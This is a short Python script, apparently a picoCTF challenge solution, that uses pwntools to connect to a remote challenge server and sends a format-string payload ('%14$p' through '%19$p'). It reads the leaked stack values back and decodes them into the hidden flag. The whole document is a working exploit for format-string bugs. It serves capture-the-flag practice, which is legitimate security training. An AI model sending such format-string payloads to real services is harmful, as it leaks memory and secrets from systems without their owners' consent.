from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'
p = remote('mimas.picoctf.net', 59529)

# rbp-0x410: buffer
# rbp-0x490: flag
# rbp-0x4d0: rsp
# offset = 30
p.recvline()
# p.sendline(b"AAAAAAA." + b"%p." * 0x20)
p.sendline(b"%14$p.%15$p.%16$p.%17$p.%18$p.%19$p")
p.recvuntil(b"order: ")
result = p.recvline().decode().strip().split('.')
log.info(result)

ans = ""
for v in result:
    val = int(v, 16)
    ans += p64(val).decode()
    log.info(p64(val).decode())
log.success(ans)
